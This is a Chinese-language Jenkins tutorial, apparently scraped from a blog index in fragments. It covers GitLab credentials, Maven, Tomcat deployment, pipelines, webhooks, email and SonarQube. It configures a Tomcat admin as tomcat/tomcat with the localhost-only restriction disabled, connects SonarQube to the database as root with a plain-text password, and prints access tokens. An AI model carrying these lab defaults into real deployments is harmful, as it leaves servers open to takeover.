text：需要保存的一个加密的文本串，如钉钉机器人或Github的api token Certificate：通过上传证书文件的方式 常用的凭证类型有：Username with password（用户密码）和SSH Username with private key（SSH 密钥） 接下来以使用Git工具到Gitlab拉取项目源码为例，演示Jenkins的如何管理Gitlab的凭证。 安装Git插件和Git工具 为了让Jenkins支持从Gitlab拉取源码，需要安装Git插件以及在CentOS7上安装Git工具。 Git插件安装： CentOS7上安装Git工具： yum install git -y 安装 git –version 安装后查看版本 用户密码类型 1 ）创建凭证 Jenkins-\u003e凭证-\u003e系统-\u003e全局凭证-\u003e添加凭证 选择\"Username with password\"，输入Gitlab的用户名和密码，点击\"确定\"。 2 ）测试凭证是否可用 创建一个FreeStyle项目：新建Item-\u003eFreeStyle Project-\u003e确定 找到\"源码管理\"-\u003e“Git”，在Repository URL复制Gitlab中的项目URL 这时会报错说无法连接仓库！在Credentials选择刚刚添加的凭证就不报错啦 保存配置后，点击构建”Build Now“ 开始构建项目 查看/var/lib/jenkins/workspace/目录，发现已经从Gitlab成功拉取了代码到Jenkins中。 SSH密钥类型 SSH免密登录示意图 1 ）使用root用户生成公钥和私钥 ssh-keygen -t rsa 在/root/.ssh/目录保存了公钥和使用 id_rsa：私钥文件 id_rsa.pub：公钥文件 2 ）把生成的公钥放在Gitlab中 以root账户登录-\u003e点击头像-\u003eSettings-\u003eSSH Keys 复制刚才id_rsa.pub文件的内容到这里，点击\"Add Key\" 3 ）在Jenkins中添加凭证，配置私钥 在Jenkins添加一个新的凭证，类型为\"SSH Username with private key\"，把刚才生成私有文件内容复 制过来 4 ）测试凭证是否可用 新建\"test02\"项目-\u003e源码管理-\u003eGit，这次要使用Gitlab的SSH连接，并且选择SSH凭证 同样尝试构建项目，如果代码可以正常拉取，代表凭证配置成功！ ","date":"2021-04-06","objectID":"/posts/jenkins%E6%8C%81%E7%BB%AD%E9%9B%86%E6%88%90%E5%85%A5%E9%97%A8%E5%88%B0%E7%B2%BE%E9%80%9A/:3:7","tags":["jenkins"],"title":"Jenkins持续集成入门到精通","uri":"/posts/jenkins%E6%8C%81%E7%BB%AD%E9%9B%86%E6%88%90%E5%85%A5%E9%97%A8%E5%88%B0%E7%B2%BE%E9%80%9A/"},{"categories":["运维"],"content":"持续集成环境(5)-Maven安装和配置 在Jenkins集成服务器上，我们需要安装Maven来编译和打包项目。 安装Maven 先上传Maven软件到192.168.66.101 tar -xzf apache-maven-3.6.2-bin.tar.gz 解压 mkdir -p /opt/maven 创建目录 mv apache-maven-3.6.2/* /opt/maven 移动文件 配置环境变量 vi /etc/profile source /etc/profile 配置生效 mvn -v 查找Maven版本 全局工具配置关联JDK和Maven Jenkins-\u003eGlobal Tool Configuration-\u003eJDK-\u003e新增JDK，配置如下： Jenkins-\u003eGlobal Tool Configuration-\u003eMaven-\u003e新增Maven，配置如下： export JAVA_HOME=/usr/lib/jvm/java- 1. 8. 0 - openjdk export MAVEN_HOME=/opt/maven export PATH=$PATH:$JAVA_HOME/bin:$MAVEN_HOME/bin 添加Jenkins全局变量 Manage Jenkins-\u003eConfigure System-\u003eGlobal Properties ，添加三个全局变量 JAVA_HOME、M2_HOME、PATH+EXTRA 修改Maven的settings.xml mkdir /root/repo 创建本地仓库目录 vi /opt/maven/conf/settings.xml 本地仓库改为：/root/repo/ 添加阿里云私服地址： alimaven aliyun maven http://maven.aliyun.com/nexus/content/groups/public/ central 测试Maven是否配置成功 使用之前的gitlab密码测试项目，修改配置 构建-\u003e增加构建步骤-\u003eExecute Shell 输入 mvn clean package 再次构建，如果可以把项目打成war包，代表maven环境配置成功啦！ ","date":"2021-04-06","objectID":"/posts/jenkins%E6%8C%81%E7%BB%AD%E9%9B%86%E6%88%90%E5%85%A5%E9%97%A8%E5%88%B0%E7%B2%BE%E9%80%9A/:3:8","tags":["jenkins"],"title":"Jenkins持续集成入门到精通","uri":"/posts/jenkins%E6%8C%81%E7%BB%AD%E9%9B%86%E6%88%90%E5%85%A5%E9%97%A8%E5%88%B0%E7%B2%BE%E9%80%9A/"},{"categories":["运维"],"content":"持续集成环境(6)-Tomcat安装和配置 安装Tomcat8.5 把Tomcat压缩包上传到192.168.66.102服务器 yum install java-1.8.0-openjdk* -y 安装JDK（已完成） tar -xzf apache-tomcat-8.5.47.tar.gz 解压 mkdir -p /opt/tomcat 创建目录 mv /root/apache-tomcat-8.5.47/* /opt/tomcat 移动文件 /opt/tomcat/bin/startup.sh 启动tomcat 注意：服务器已经关闭了防火墙，所以可以直接访问Tomcat啦 地址为：http://192.168.66.102/8080 配置Tomcat用户角色权限 默认情况下Tomcat是没有配置用户角色权限的 但是，后续Jenkins部署项目到Tomcat服务器，需要用到Tomcat的用户，所以修改tomcat以下配置， 添加用户及权限 vi /opt/tomcat/conf/tomcat-users.xml 内容如下： 用户和密码都是：tomcat 注意：为了能够刚才配置的用户登录到Tomcat，还需要修改以下配置 vi /opt/tomcat/webapps/manager/META-INF/context.xml 把上面这行注释掉即可！ 重启Tomcat，访问测试 /opt/tomcat/bin/shutdown.sh 停止 /opt/tomcat/bin/startup.sh 启动 访问： http://192.168.66.102:8080/manager/html ，输入tomcat和tomcat，看到以下页面代表成功 啦 \u003ctomcat-users\u003e \u003crole rolename=\"tomcat\"/\u003e \u003crole rolename=\"role 1 \"/\u003e \u003crole rolename=\"manager-script\"/\u003e \u003crole rolename=\"manager-gui\"/\u003e \u003crole rolename=\"manager-status\"/\u003e \u003crole rolename=\"admin-gui\"/\u003e \u003crole rolename=\"admin-script\"/\u003e \u003cuser username=\"tomcat\" password=\"tomcat\" roles=\"manager-gui,manager- script,tomcat,admin-gui,admin-script\"/\u003e \u003c/tomcat-users\u003e \u003c!– \u003cValve className=\"org.apache.catalina.valves.RemoteAddrValve\" allow=\" 127 \\.\\d+\\.\\d+\\.\\d+|:: 1 | 0 : 0 : 0 : 0 : 0 : 0 : 0 : 1 \" /\u003e -\u003e ","date":"2021-04-06","objectID":"/posts/jenkins%E6%8C%81%E7%BB%AD%E9%9B%86%E6%88%90%E5%85%A5%E9%97%A8%E5%88%B0%E7%B2%BE%E9%80%9A/:3:9","tags":["jenkins"],"title":"Jenkins持续集成入门到精通","uri":"/posts/jenkins%E6%8C%81%E7%BB%AD%E9%9B%86%E6%88%90%E5%85%A5%E9%97%A8%E5%88%B0%E7%B2%BE%E9%80%9A/"},{"categories":["运维"],"content":"3 、Jenkins构建Maven项目 ","date":"2021-04-06","objectID":"/posts/jenkins%E6%8C%81%E7%BB%AD%E9%9B%86%E6%88%90%E5%85%A5%E9%97%A8%E5%88%B0%E7%B2%BE%E9%80%9A/:4:0","tags":["jenkins"],"title":"Jenkins持续集成入门到精通","uri":"/posts/jenkins%E6%8C%81%E7%BB%AD%E9%9B%86%E6%88%90%E5%85%A5%E9%97%A8%E5%88%B0%E7%B2%BE%E9%80%9A/"},{"categories":["运维"],"content":"Jenkins项目构建类型(1)-Jenkins构建的项目类型介绍 Jenkins中自动构建项目的类型有很多，常用的有以下三种： 自由风格软件项目（FreeStyle Project） Maven项目（Maven Project） 流水线项目（Pipeline Project） 每种类型的构建其实都可以完成一样的构建过程与结果，只是在操作方式、灵活度等方面有所区别，在 实际开发中可以根据自己的需求和习惯来选择。（PS：个人推荐使用流水线类型，因为灵活度非常高） ","date":"2021-04-06","objectID":"/posts/jenkins%E6%8C%81%E7%BB%AD%E9%9B%86%E6%88%90%E5%85%A5%E9%97%A8%E5%88%B0%E7%B2%BE%E9%80%9A/:4:1","tags":["jenkins"],"title":"Jenkins持续集成入门到精通","uri":"/posts/jenkins%E6%8C%81%E7%BB%AD%E9%9B%86%E6%88%90%E5%85%A5%E9%97%A8%E5%88%B0%E7%B2%BE%E9%80%9A/"},{"categories":["运维"],"content":"Jenkins项目构建类型(2)-自由风格项目构建 下面演示创建一个自由风格项目来完成项目的集成过程： 拉取代码-\u003e编译-\u003e打包-\u003e部署 拉取代码 1 ）创建项目 2 ）配置源码管理，从gitlab拉取代码 编译打包 构建-\u003e添加构建步骤-\u003eExecutor Shell 部署 把项目部署到远程的Tomcat里面 1 ）安装 Deploy to container插件 Jenkins本身无法实现远程部署到Tomcat的功能，需要安装Deploy to container插件实现 echo \"开始编译和打包\" mvn clean package echo \"编译和打包结束\" 2 ）添加Tomcat用户凭证 3 ）添加构建后操作 点击\"Build Now\"，开始构建过程 4 ）部署成功后，访问项目 http://192.168.66.102:8080/web_demo-1.0-SNAPSHOT/ 演示改动代码后的持续集成 1 ）IDEA中源码修改并提交到gitlab 2 ）在Jenkins中项目重新构建 3 ）访问Tomcat ","date":"2021-04-06","objectID":"/posts/jenkins%E6%8C%81%E7%BB%AD%E9%9B%86%E6%88%90%E5%85%A5%E9%97%A8%E5%88%B0%E7%B2%BE%E9%80%9A/:4:2","tags":["jenkins"],"title":"Jenkins持续集成入门到精通","uri":"/posts/jenkins%E6%8C%81%E7%BB%AD%E9%9B%86%E6%88%90%E5%85%A5%E9%97%A8%E5%88%B0%E7%B2%BE%E9%80%9A/"},{"categories":["运维"],"content":"Jenkins项目构建类型(3)-Maven项目构建 1 ）安装Maven Integration插件 2 ）创建Maven项目 3 ）配置项目 拉取代码和远程部署的过程和自由风格项目一样，只是\"构建\"部分不同 ","date":"2021-04-06","objectID":"/posts/jenkins%E6%8C%81%E7%BB%AD%E9%9B%86%E6%88%90%E5%85%A5%E9%97%A8%E5%88%B0%E7%B2%BE%E9%80%9A/:4:3","tags":["jenkins"],"title":"Jenkins持续集成入门到精通","uri":"/posts/jenkins%E6%8C%81%E7%BB%AD%E9%9B%86%E6%88%90%E5%85%A5%E9%97%A8%E5%88%B0%E7%B2%BE%E9%80%9A/"},{"categories":["运维"],"content":"Jenkins项目构建类型(4)-Pipeline流水线项目构建(*) Pipeline简介 1 ）概念 Pipeline，简单来说，就是一套运行在 Jenkins 上的工作流框架，将原来独立运行于单个或者多个节点 的任务连接起来，实现单个任务难以完成的复杂流程编排和可视化的工作。 2 ）使用Pipeline有以下好处（来自翻译自官方文档）： 代码：Pipeline以代码的形式实现，通常被检入源代码控制，使团队能够编辑，审查和迭代其传送流 程。 持久：无论是计划内的还是计划外的服务器重启，Pipeline都是可恢复的。 可停止：Pipeline可接 收交互式输入，以确定是否继续执行Pipeline。 多功能：Pipeline支持现实世界中复杂的持续交付要 求。它支持fork/join、循环执行，并行执行任务的功能。 可扩展：Pipeline插件支持其DSL的自定义扩 展 ，以及与其他插件集成的多个选项。 3 ）如何创建 Jenkins Pipeline呢？ Pipeline 脚本是由 Groovy 语言实现的，但是我们没必要单独去学习 Groovy Pipeline 支持两种语法：Declarative(声明式)和 Scripted Pipeline(脚本式)语法 Pipeline 也有两种创建方法：可以直接在 Jenkins 的 Web UI 界面中输入脚本；也可以通过创建一 个 Jenkinsfile 脚本文件放入项目源码库中（一般我们都推荐在 Jenkins 中直接从源代码控制(SCM) 中直接载入 Jenkinsfile Pipeline 这种方法）。 安装Pipeline插件 Manage Jenkins-\u003eManage Plugins-\u003e可选插件 安装插件后，创建项目的时候多了“流水线”类型 Pipeline语法快速入门 1 ）Declarative声明式-Pipeline 创建项目 流水线-\u003e选择HelloWorld模板 生成内容如下： stages：代表整个流水线的所有执行阶段。通常stages只有 1 个，里面包含多个stage pipeline { agent any stages { stage('Hello') { steps { echo 'Hello World' } } } } stage：代表流水线中的某个阶段，可能出现n个。一般分为拉取代码，编译构建，部署等阶段。 steps：代表一个阶段内需要执行的逻辑。steps里面是shell脚本，git拉取代码，ssh远程发布等任意内 容。 编写一个简单声明式Pipeline： 点击构建，可以看到整个构建过程 2 ）Scripted Pipeline脚本式-Pipeline 创建项目 pipeline { agent any stages { stage('拉取代码') { steps { echo '拉取代码' } } stage('编译构建') { steps { echo '编译构建' } } stage('项目部署') { steps { echo '项目部署' } } } } 这次选择\"Scripted Pipeline\" Node：节点，一个 Node 就是一个 Jenkins 节点，Master 或者 Agent，是执行 Step 的具体运行 环境，后续讲到Jenkins的Master-Slave架构的时候用到。 Stage：阶段，一个 Pipeline 可以划分为若干个 Stage，每个 Stage 代表一组操作，比如： Build、Test、Deploy，Stage 是一个逻辑分组的概念。 Step：步骤，Step 是最基本的操作单元，可以是打印一句话，也可以是构建一个 Docker 镜像， 由各类 Jenkins 插件提供，比如命令：sh ‘make’，就相当于我们平时 shell 终端中执行 make 命令 一样。 编写一个简单的脚本式Pipeline node { def mvnHome stage('Preparation') { // for display purposes } stage('Build') { } stage('Results') { } } 构建结果和声明式一样！ 拉取代码 编译打包 node { def mvnHome stage('拉取代码') { // for display purposes echo '拉取代码' } stage('编译构建') { echo '编译构建' } stage('项目部署') { echo '项目部署' } } pipeline { agent any stages { stage('拉取代码') { steps { checkout([$class: 'GitSC","date":"2021-04-06","objectID":"/posts/jenkins%E6%8C%81%E7%BB%AD%E9%9B%86%E6%88%90%E5%85%A5%E9%97%A8%E5%88%B0%E7%B2%BE%E9%80%9A/:4:4","tags":["jenkins"],"title":"Jenkins持续集成入门到精通","uri":"/posts/jenkins%E6%8C%81%E7%BB%AD%E9%9B%86%E6%88%90%E5%85%A5%E9%97%A8%E5%88%B0%E7%B2%BE%E9%80%9A/"},{"categories":["运维"],"content":"Jenkins项目构建细节(1)-常用的构建触发器 Jenkins内置 4 种构建触发器： 触发远程构建 其他工程构建后触发（Build after other projects are build） 定时构建（Build periodically） 轮询SCM（Poll SCM） 触发远程构建 触发构建url：http://192.168.66.101:8888/job/web_demo_pipeline/build?token=6666 其他工程构建后触发 1 ）创建pre_job流水线工程 2 ）配置需要触发的工程 定时构建 定时字符串从左往右分别为： 分 时 日 月 周 一些定时表达式的例子： 每 30 分钟构建一次：H代表形参 H/30 * * * * 10:02 10:32 每 2 个小时构建一次: H H/2 * * * 每天的 8 点， 12 点， 22 点，一天构建 3 次： (多个时间点中间用逗号隔开) 0 8,12,22 * * * 每天中午 12 点定时构建一次 H 12 * * * 每天下午 18 点定时构建一次 H 18 * * * 在每个小时的前半个小时内的每 10 分钟 H(0-29)/10 * * * * 每两小时一次，每个工作日上午 9 点到下午 5 点(也许是上午10:38，下午12:38，下午2:38，下午 4:38) H H(9-16)/2 * * 1-5 轮询SCM 轮询SCM，是指定时扫描本地代码仓库的代码是否有变更，如果代码有变更就触发项目构建。 注意：这次构建触发器，Jenkins会定时扫描本地整个项目的代码，增大系统的开销，不建议使用。 ","date":"2021-04-06","objectID":"/posts/jenkins%E6%8C%81%E7%BB%AD%E9%9B%86%E6%88%90%E5%85%A5%E9%97%A8%E5%88%B0%E7%B2%BE%E9%80%9A/:4:5","tags":["jenkins"],"title":"Jenkins持续集成入门到精通","uri":"/posts/jenkins%E6%8C%81%E7%BB%AD%E9%9B%86%E6%88%90%E5%85%A5%E9%97%A8%E5%88%B0%E7%B2%BE%E9%80%9A/"},{"categories":["运维"],"content":"Jenkins项目构建细节(2)-Git hook自动触发构建(*) 刚才我们看到在Jenkins的内置构建触发器中，轮询SCM可以实现Gitlab代码更新，项目自动构建，但是 该方案的性能不佳。那有没有更好的方案呢？ 有的。就是利用Gitlab的webhook实现代码push到仓 库，立即触发项目自动构建。 安装Gitlab Hook插件 需要安装两个插件： Gitlab Hook和GitLab Jenkins设置自动构建 等会需要把生成的webhook URL配置到Gitlab中。 Gitlab配置webhook 1 ）开启webhook功能 使用root账户登录到后台，点击Admin Area -\u003e Settings -\u003e Network 勾选\"Allow requests to the local network from web hooks and services\" 2 ）在项目添加webhook 点击项目-\u003eSettings-\u003eIntegrations 注意：以下设置必须完成，否则会报错！ Manage Jenkins-\u003eConfigure System ","date":"2021-04-06","objectID":"/posts/jenkins%E6%8C%81%E7%BB%AD%E9%9B%86%E6%88%90%E5%85%A5%E9%97%A8%E5%88%B0%E7%B2%BE%E9%80%9A/:4:6","tags":["jenkins"],"title":"Jenkins持续集成入门到精通","uri":"/posts/jenkins%E6%8C%81%E7%BB%AD%E9%9B%86%E6%88%90%E5%85%A5%E9%97%A8%E5%88%B0%E7%B2%BE%E9%80%9A/"},{"categories":["运维"],"content":"Jenkins项目构建细节(3)-Jenkins的参数化构建 有时在项目构建的过程中，我们需要根据用户的输入动态传入一些参数，从而影响整个构建结果，这时 我们可以使用参数化构建。 Jenkins支持非常丰富的参数类型 接下来演示通过输入gitlab项目的分支名称来部署不同分支项目。 项目创建分支，并推送到Gitlab上 新 新建分支：v1，代码稍微改动下，然后提交到gitlab上。 这时看到gitlab上有一个两个分支：master和v1 在Jenkins添加字符串类型参数 改动pipeline流水线代码 点击Build with Parameters 输入分支名称，构建即可！构建完成后访问Tomcat查看结果 ","date":"2021-04-06","objectID":"/posts/jenkins%E6%8C%81%E7%BB%AD%E9%9B%86%E6%88%90%E5%85%A5%E9%97%A8%E5%88%B0%E7%B2%BE%E9%80%9A/:4:7","tags":["jenkins"],"title":"Jenkins持续集成入门到精通","uri":"/posts/jenkins%E6%8C%81%E7%BB%AD%E9%9B%86%E6%88%90%E5%85%A5%E9%97%A8%E5%88%B0%E7%B2%BE%E9%80%9A/"},{"categories":["运维"],"content":"Jenkins项目构建细节(4)-配置邮箱服务器发送构建结果 安装Email Extension插件 Jenkins设置邮箱相关参数 Manage Jenkins-\u003eConfigure System 设置邮件参数 设置Jenkins默认邮箱信息 准备邮件内容 在项目根目录编写email.html，并把文件推送到Gitlab，内容如下： 编写Jenkinsfile添加构建后发送邮件 \u003ctr\u003e \u003ctd\u003e \u003cul\u003e \u003cli\u003e历史变更记录 : \u003ca href=\"${PROJECT_URL}changes\"\u003e${PROJECT_URL}changes\u003c/a\u003e\u003c/li\u003e \u003c/ul\u003e ${CHANGES_SINCE_LAST_SUCCESS,reverse=true, format=\"Changes for Build #%n:\u003cbr /\u003e%c\u003cbr /\u003e\",showPaths=true,changesFormat=\"\u003cpre\u003e[%a]\u003cbr /\u003e%m\u003c/pre\u003e\",pathFormat=\"\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;%p\"} \u003c/td\u003e \u003c/tr\u003e \u003ctr\u003e \u003ctd\u003e\u003cb\u003eFailed Test Results\u003c/b\u003e \u003chr size=\" 2 \" width=\" 100 %\" align=\"center\" /\u003e\u003c/td\u003e \u003c/tr\u003e \u003ctr\u003e \u003ctd\u003e\u003cpre style=\"font-size: 11 pt; font-family: Tahoma, Arial, Helvetica, sans-serif\"\u003e$FAILED_TESTS\u003c/pre\u003e \u003cbr /\u003e\u003c/td\u003e \u003c/tr\u003e \u003ctr\u003e \u003ctd\u003e\u003cb\u003e\u003cfont color=\"# 0 B 610 B\"\u003e构建日志 (最后 100 行):\u003c/font\u003e\u003c/b\u003e \u003chr size=\" 2 \" width=\" 100 %\" align=\"center\" /\u003e\u003c/td\u003e \u003c/tr\u003e \u003ctr\u003e \u003ctd\u003e\u003ctextarea cols=\" 80 \" rows=\" 30 \" readonly=\"readonly\" style=\"font-family: Courier New\"\u003e${BUILD_LOG, maxLines= 100 }\u003c/textarea\u003e \u003c/td\u003e \u003c/tr\u003e \u003c/table\u003e \u003c/body\u003e \u003c/html\u003e pipeline { agent any stages { stage('拉取代码') { steps { checkout([$class: 'GitSCM', branches: [[name: '*/master']], doGenerateSubmoduleConfigurations: false, extensions: [], submoduleCfg: [], userRemoteConfigs: [[credentialsId: ' 68 f 2087 f-a 034 - 4 d 39 - a 9 ff- 1 f 776 dd 3 dfa 8 ', url: 'git@ 192. 168. 66. 100 :itheima_group/web_demo.git']]]) } } stage('编译构建') { steps { sh label: '', script: 'mvn clean package' } } stage('项目部署') { steps { 测试 PS：邮件相关全局参数参考列表： 系统设置-\u003eExtended E-mail Notification-\u003eContent Token Reference，点击旁边的?号 deploy adapters: [tomcat 8 (credentialsId: 'afc 43 e 5 e- 4 a 4 e- 4 de 6 - 984 f- b 1 d 5 a 254 e 434 ', path: '', url: 'http:// 192. 168. 66. 102 : 8080 ')], contextPath: null, war: 'target/*.war' } } } post { always { emailext( subject: '构建通知：${PROJECT_NAME} - Build # ${BUILD_NUMBER} - ${BUILD_STATUS}!', body: '${FILE,path=\"email.html\"}', to: 'xxx@qq.com' ) } } } 软件 服务器 版本 JDK 192.168.66.101 1.8 MySQL 192.168.66.101 5.7 SonarQube 192.168.66.101 6.7.4 ","date":"2021-04-06","objectID":"/posts/jenkins%E6%8C%81%E7%BB%AD%E9%9B%86%E6%88%90%E5%85%A5%E9%97%A8%E5%88%B0%E7%B2%BE%E9%80%9A/:4:8","tags":["jenkins"],"title":"Jenkins持续集成入门到精通","uri":"/posts/jenkins%E6%8C%81%E7%BB%AD%E9%9B%86%E6%88%90%E5%85%A5%E9%97%A8%E5%88%B0%E7%B2%BE%E9%80%9A/"},{"categories":["运维"],"content":"Jenkins+SonarQube代码审查(1) - 安装SonarQube SonaQube简介 SonarQube是一个用于管理代码质量的开放平台，可以快速的定位代码中潜在的或者明显的错误。目前 支持java,C#,C/C++,Python,PL/SQL,Cobol,JavaScrip,Groovy等二十几种编程语言的代码质量管理与检 测。 官网：https://www.sonarqube.org/ 环境要求 安装SonarQube 1 ）安装MySQL（已完成） 2 ）安装SonarQube 在MySQL创建sonar数据库 下载sonar压缩包： https://www.sonarqube.org/downloads/ 解压sonar，并设置权限 yum install unzip unzip sonarqube-6.7.4.zip 解压 mkdir /opt/sonar 创建目录 mv sonarqube-6.7.4/* /opt/sonar 移动文件 useradd sonar 创建sonar用户，必须sonar用于启动，否则报错 chown -R sonar. /opt/sonar 更改sonar目录及文件权限 修改sonar配置文件 vi /opt/sonarqube-6.7.4/conf/sonar.properties 内容如下： sonar.jdbc.username=root sonar.jdbc.password=Root@123 sonar.jdbc.url=jdbc:mysql://localhost:3306/sonar? useUnicode=true\u0026characterEncoding=utf8\u0026rewriteBatchedStatements=true\u0026useConfigs= maxPerformance\u0026useSSL=false 注意：sonar默认监听 9000 端口，如果 9000 端口被占用，需要更改。 启动sonar cd /opt/sonarqube-6.7.4 su sonar ./bin/linux-x86-64/sonar.sh start 启动 su sonar ./bin/linux-x86-64/sonar.sh status 查看状态 su sonar ./bin/linux-x86-64/sonar.sh stop 停止 tail -f logs/sonar.logs 查看日志 访问sonar http://192.168.66.101:9000 默认账户：admin/admin 创建token bb8b6c53d9d921e101343cef0395243e6c1dc8a3 token要记下来后面要使用 0151ae8c548a143eda9253e4334ad030b56047ee ","date":"2021-04-06","objectID":"/posts/jenkins%E6%8C%81%E7%BB%AD%E9%9B%86%E6%88%90%E5%85%A5%E9%97%A8%E5%88%B0%E7%B2%BE%E9%80%9A/:4:9","tags":["jenkins"],"title":"Jenkins持续集成入门到精通","uri":"/posts/jenkins%E6%8C%81%E7%BB%AD%E9%9B%86%E6%88%90%E5%85%A5%E9%97%A8%E5%88%B0%E7%B2%BE%E9%80%9A/"},{"categories":["运维"],"content":"Jenkins+SonarQube代码审查(2) - 实现代码审查 安装SonarQube Scanner插件 添加SonarQube凭证 Jenkins进行SonarQube配置 Manage Jenkins-\u003eConfigure System-\u003eSonarQube servers Manage Jenkins-\u003eGlobal Tool Configuration SonaQube关闭审查结果上传到SCM功能 在项目添加SonaQube代码审查（非流水线项目） 添加构建步骤： 在项目添加SonaQube代码审查（流水线项目） 1 ）项目根目录下，创建sonar-project.properties文件 2 ）修改Jenkinsfile，加入SonarQube代码审查阶段 # must be unique in a given SonarQube instance sonar.projectKey=web_demo # this is the name and version displayed in the SonarQube UI. Was mandatory prior to SonarQube 6. 1. sonar.projectName=web_demo sonar.projectVersion= 1. 0 # Path is relative to the sonar-project.properties file. Replace \"\\\" by \"/\" on Windows. # This property is optional if sonar.modules is set. sonar.sources=. sonar.exclusions=**/test/**,**/target/** sonar.java.source= 1. 8 sonar.java.target= 1. 8 # Encoding of the source code. Default is default system encoding sonar.sourceEncoding=UTF- 8 # must be unique in a given SonarQube instance sonar.projectKey=web_demo # this is the name and version displayed in the SonarQube UI. Was mandatory prior to SonarQube 6. 1. sonar.projectName=web_demo sonar.projectVersion= 1. 0 # Path is relative to the sonar-project.properties file. Replace \"\\\" by \"/\" on Windows. # This property is optional if sonar.modules is set. sonar.sources=. sonar.exclusions=**/test/**,**/target/** sonar.java.source= 1. 8 sonar.java.target= 1. 8 # Encoding of the source code. Default is default system encoding sonar.sourceEncoding=UTF- 8 3 ）到SonarQube的UI界面查看审查结果 pipeline { agent any stages { stage('拉取代码') { steps { checkout([$class: 'GitSCM', branches: [[name: '*/master']], doGenerateSubmoduleConfigurations: false, extensions: [], submoduleCfg: [], userRemoteConfigs: [[credentialsId: ' 68 f 2087 f-a 034 - 4 d 39 - a 9 ff- 1 f 776 dd 3 dfa 8 ', url: 'git@ 192. 168. 66. 100 :itheima_group/web_demo.git']]]) } } stage('编译构建') { steps { sh label: '', script: 'mvn clean package' } } stage('SonarQube代码审查') { steps{ script { scannerHome = tool 'sonarqube-scan","date":"2021-04-06","objectID":"/posts/jenkins%E6%8C%81%E7%BB%AD%E9%9B%86%E6%88%90%E5%85%A5%E9%97%A8%E5%88%B0%E7%B2%BE%E9%80%9A/:4:10","tags":["jenkins"],"title":"Jenkins持续集成入门到精通","uri":"/posts/jenkins%E6%8C%81%E7%BB%AD%E9%9B%86%E6%88%90%E5%85%A5%E9%97%A8%E5%88%B0%E7%B2%BE%E9%80%9A/"},{"categories":["运维"],"content":"4 、Jenkins+Docker+SpringCloud微服务持续集成(上) ","date":"2021-04-06","objectID":"/posts/jenkins%E6%8C%81%E7%BB%AD%E9%9B%86%E6%88%90%E5%85%A5%E9%97%A8%E5%88%B0%E7%B2%BE%E9%80%9A/:5:0","tags":["jenkins"],"title":"Jenkins持续集成入门到精通","uri":"/posts/jenkins%E6%8C%81%E7%BB%AD%E9%9B%86%E6%88%90%E5%85%A5%E9%97%A8%E5%88%B0%E7%B2%BE%E9%80%9A/"},{"categories":["运维"],"content":"Jenkins+Docker+SpringCloud持续集成流程说明 大致流程说明： 1 ）开发人员每天把代码提交到Gitlab代码仓库 2 ）Jenkins从Gitlab中拉取项目源码，编译并打成jar包，然后构建成Docker镜像，将镜像上传到 Harbor私有仓库。 3 ）Jenkins发送SSH远程命令，让生产部署服务器到Harbor私有仓库拉取镜像到本地，然后创建容器。 4 ）最后，用户可以访问到容器 服务列表(红色的软件为需要安装的软件，黑色代表已经安装) 服务器名称生产部署服务器 IP192.168.66.103地址 安装的软件Docker18.06.1-ce ","date":"2021-04-06","objectID":"/posts/jenkins%E6%8C%81%E7%BB%AD%E9%9B%86%E6%88%90%E5%85%A5%E9%97%A8%E5%88%B0%E7%B2%BE%E9%80%9A/:5:1","tags":["jenkins"],"title":"Jenkins持续集成入门到精通","uri":"/posts/jenkins%E6%8C%81%E7%BB%AD%E9%9B%86%E6%88%90%E5%85%A5%E9%97%A8%E5%88%B0%E7%B2%BE%E9%80%9A/"},{"categories":["运维"],"content":"SpringCloud微服务源码概述 项目架构：前后端分离 后端技术栈：SpringBoot+SpringCloud+SpringDataJpa（Spring全家桶） 微服务项目结构： tensquare_parent：父工程，存放基础配置 tensquare_common：通用工程，存放工具类 tensquare_eureka_server：SpringCloud的Eureka注册中心 tensquare_zuul：SpringCloud的网关服务 tensquare_admin_service：基础权限认证中心，负责用户认证（使用JWT认证） tensquare_gathering：一个简单的业务模块，活动微服务相关逻辑 数据库结构： tensquare_user：用户认证数据库，存放用户账户数据。对应tensquare_admin_service微服务 tensquare_gathering：活动微服务数据库。对应tensquare_gathering微服务 微服务配置分析： tensquare_eureka tensquare_zuul tensquare_admin_service tensquare_gathering ","date":"2021-04-06","objectID":"/posts/jenkins%E6%8C%81%E7%BB%AD%E9%9B%86%E6%88%90%E5%85%A5%E9%97%A8%E5%88%B0%E7%B2%BE%E9%80%9A/:5:2","tags":["jenkins"],"title":"Jenkins持续集成入门到精通","uri":"/posts/jenkins%E6%8C%81%E7%BB%AD%E9%9B%86%E6%88%90%E5%85%A5%E9%97%A8%E5%88%B0%E7%B2%BE%E9%80%9A/"},{"categories":["运维"],"content":"本地部署(1)-SpringCloud微服务部署 本地运行微服务 1 ）逐一启动微服务 2 ）使用postman测试功能是否可用 本地部署微服务 1 ）SpringBoot微服务项目打包 必须导入该插件 打包后在target下产生jar包 2 ）本地运行微服务的jar包 java -jar xxx.jar 3 ）查看效果 ","date":"2021-04-06","objectID":"/posts/jenkins%E6%8C%81%E7%BB%AD%E9%9B%86%E6%88%90%E5%85%A5%E9%97%A8%E5%88%B0%E7%B2%BE%E9%80%9A/:5:3","tags":["jenkins"],"title":"Jenkins持续集成入门到精通","uri":"/posts/jenkins%E6%8C%81%E7%BB%AD%E9%9B%86%E6%88%90%E5%85%A5%E9%97%A8%E5%88%B0%E7%B2%BE%E9%80%9A/"},{"categories":["运维"],"content":"本地部署(2)-前端静态web网站 前端技术栈：NodeJS+VueJS+ElementUI 使用Visual Studio Code打开源码 1 ）本地运行 npm run dev 2 ）打包静态web网站 npm run build 打包后，产生dist目录的静态文件 3 ）部署到nginx服务器 把dist目录的静态文件拷贝到nginx的html目录，启动nginx 4 ）启动nginx，并访问 http://localhost:82 ","date":"2021-04-06","objectID":"/posts/jenkins%E6%8C%81%E7%BB%AD%E9%9B%86%E6%88%90%E5%85%A5%E9%97%A8%E5%88%B0%E7%B2%BE%E9%80%9A/:5:4","tags":["jenkins"],"title":"Jenkins持续集成入门到精通","uri":"/posts/jenkins%E6%8C%81%E7%BB%AD%E9%9B%86%E6%88%90%E5%85%A5%E9%97%A8%E5%88%B0%E7%B2%BE%E9%80%9A/"},{"categories":["运维"],"content":"环境准备(1)-Docker快速入门 Docker简介 \u003cplugin\u003e \u003cgroupId\u003eorg.springframework.boot\u003c/groupId\u003e \u003cartifactId\u003espring-boot-maven-plugin\u003c/artifactId\u003e \u003c/plugin\u003e 虚拟机 容器 占用磁盘空间 非常大，GB级 小，MB甚至KB级 启动速度 慢，分钟级 快，秒级 运行形态 运行于Hypervisor上 